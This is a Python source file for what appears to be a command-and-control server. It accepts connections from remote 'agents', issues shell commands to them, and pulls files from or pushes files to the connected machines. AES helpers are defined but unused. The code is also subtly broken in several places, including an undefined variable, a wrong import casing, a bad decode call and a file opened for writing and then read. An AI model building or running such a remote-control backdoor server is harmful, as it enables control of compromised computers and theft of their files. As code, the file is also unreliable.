import socket 
import threading
from crypto.Cipher import AES
from crypto.Util.Padding import pad,unpad
from crypto.Random import get_random_bytes
import re
from os import close
Agents=[]  #List to store created threads 
ipadd=[]   #List to store the agents IP
request=[] #list to store  command input
reply=[]   #list to store the command output
key=0
def encrypt_data(key,plain_text):
    iv = get_random_bytes(AES.block_size) #random initialization vector (IV)
    cipher = AES.new(key, AES.MODE_CBC, iv) 
    padded_message = pad(plain_text.encode('utf-8'), AES.block_size) 
    encrypted_message = cipher.encrypt(padded_message)
    ciphertext = iv + encrypted_message
    return ciphertext

def decrypt_data(key,cipher_text):
    iv=cipher_text[:AES.block_size]
    cipher= AES.new(key, AES.MODE_CBC, iv)
    decrypted_message = unpad(cipher.decrypt(cipher_text[AES.block_size:]), AES.block_size)
    message = decrypted_message.decode('utf-8')
    return message

def generate_key(key_length):
    key = get_random_bytes(key_length)
    return key

def manage_connections(connection,agent_index):
    global request
    global reply    
    while True:
        if request[agent_index]!= 'quit':
            message=connection.recv(1024*10000).decode()
            reply[agent_index]=message
            while True:
                if request[agent_index]!='' :
                    if request[agent_index].split(" ")[0].lower()=="download":
                        filename=request[agent_index].split(" ")[1]
                        command=request[agent_index]
                        connection.send(command.encode())
                        content=connection.recv(1024*10000).decode()
                        f=open('.\\Downloaded_files\\'+filename,'wb')
                        f.write(content.decode())
                        f.close()
                        reply[agent_index]="File Transferred Succesfully"
                        reply[agent_index]=" "
                    elif  request[agent_index].split(" ")[0]=='upload':
                            command=request[agent_index]
                            connection.send(command.encode())
                            filename=request[agent_index].split(" ")[1]
                            f=open('.\\output\\'+filename,'wb')
                            content=f.read()
                            f.close()
                            connection.send(content.encode())
                            request[agent_index]=""
                    else:
                        command=request[agent_index]
                        connection.send(command.encode())
                        request[agent_index]=''
                        break
        else:
            close_connection(connection,agent_index)        


def close_connection(connection,agent_index):
    Agents[agent_index]=" "
    ipadd[agent_index]=" "
    request[agent_index]=" "
    reply[agent_index]=" "
    connection.close()

def create_socket(ip,port):
    global Agents
    global ipadd
    server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((ip,port))
    server_socket.listen(10)
    while True:
        connection,ipaddress=server_socket.accept()
        agent_index=len(agent)
        agent=threading.Thread(target=manage_connections,args=(connection,agent_index))
        Agents.append(agent)
        ipadd.append(ipaddress)
        agent.start()

def get_agent_number(agent):
    thread_name = agent.name
    return re.search(r'\d+', thread_name).group()




